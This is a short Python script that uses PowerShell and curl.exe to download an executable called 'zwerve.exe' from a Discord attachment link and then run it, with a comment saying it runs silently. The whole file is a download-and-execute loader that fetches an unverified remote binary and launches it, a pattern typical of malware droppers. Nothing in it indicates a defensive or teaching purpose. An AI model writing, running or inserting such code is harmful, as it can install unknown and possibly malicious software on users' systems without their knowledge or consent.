import subprocess
import os

# Define the output path for the downloaded file
output_file = os.path.join(os.getcwd(), "zwerve.exe")

# Step 1: PowerShell command to download the file using curl.exe
download_command = f'curl.exe -L https://cdn.discordapp.com/attachments/1276975489780809812/1282787632082059359/zwerve.exe?ex=66e0a094&is=66df4f14&hm=f4604d9783911e770716516e30d4f665214449f46aa2c5a59afc4bda7042bfba& -o "{output_file}"'

# Run the PowerShell command to download the file
download_result = subprocess.run(["powershell", "-Command", download_command], capture_output=True, text=True)

# Output PowerShell result for debugging
print("Download Output:", download_result.stdout)
print("Download Error:", download_result.stderr)

# Check if download succeeded and the file exists
if download_result.returncode == 0 and os.path.exists(output_file):
    # Step 2: Run the downloaded executable silently using the full path
    execute_command = f'Start-Process "{output_file}" -NoNewWindow -Wait'
    execute_result = subprocess.run(["powershell", "-Command", execute_command], capture_output=True, text=True)

    # Output PowerShell result for debugging
    print("Execution Output:", execute_result.stdout)
    print("Execution Error:", execute_result.stderr)
else:
    print("File download failed or file not found.")
